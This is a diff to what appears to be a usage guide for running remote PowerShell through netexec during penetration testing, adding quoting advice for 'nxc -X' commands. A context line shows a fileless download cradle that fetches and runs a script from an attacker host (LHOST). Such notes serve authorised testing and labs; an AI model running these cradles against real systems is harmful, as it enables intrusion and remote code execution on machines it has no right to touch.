@@ -33,6 +33,12 @@ Because framing is handled, you never need to detect where output begins or ends
   hand-encode. For a genuinely `$`-heavy or multi-statement script, host a readable `.ps1` and run it
   in-memory (`IEX(New-Object Net.WebClient).DownloadString('http://LHOST:8000/enum.ps1')`) rather than
   cramming it onto one line - the cradle has no `$`, the script runs on-target, nothing hits disk.
+- **Never put escaped double quotes inside an `nxc -X` command string sent through the bridge.**
+  Backslash-escaped quotes are mangled by the extra shell layer and the command dies SILENTLY: the
+  tool prints "Executed" and zero output, indistinguishable from an empty result. Use quote-free
+  PowerShell only (bare `-match word` instead of a quoted regex, wildcards instead of quoted paths
+  with spaces, `-ErrorAction SilentlyContinue`). Double every backslash - a `\\` inside the bridge's
+  double quotes collapses to `\`. If a command NEEDS inner quotes, host it as a `.ps1` cradle.
 
 ## When output is empty, truncated, or missing
 
